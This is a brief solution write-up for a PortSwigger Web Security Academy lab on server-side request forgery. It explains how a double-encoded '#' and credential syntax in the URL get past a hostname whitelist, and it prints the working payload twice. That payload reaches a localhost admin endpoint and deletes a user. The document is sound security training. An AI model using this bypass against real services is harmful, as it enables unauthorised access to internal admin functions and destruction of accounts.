# Lab: SSRF with whitelist-based input filter (Practitioner)

**Lab:** [https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

**Task (from PortSwigger):**  
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed an anti-SSRF defense you will need to bypass.

## Vulnerability
Hostname must be on a whitelist (`stock.weliketoshop.net`). URL parser accepts credentials and `#` fragment; double-encoded `#` confuses validation vs request.

## Solution

```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

Whitelist sees host `stock.weliketoshop.net`; actual request goes to `localhost` because of credential/`#` parsing quirks.

## Final Payload
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
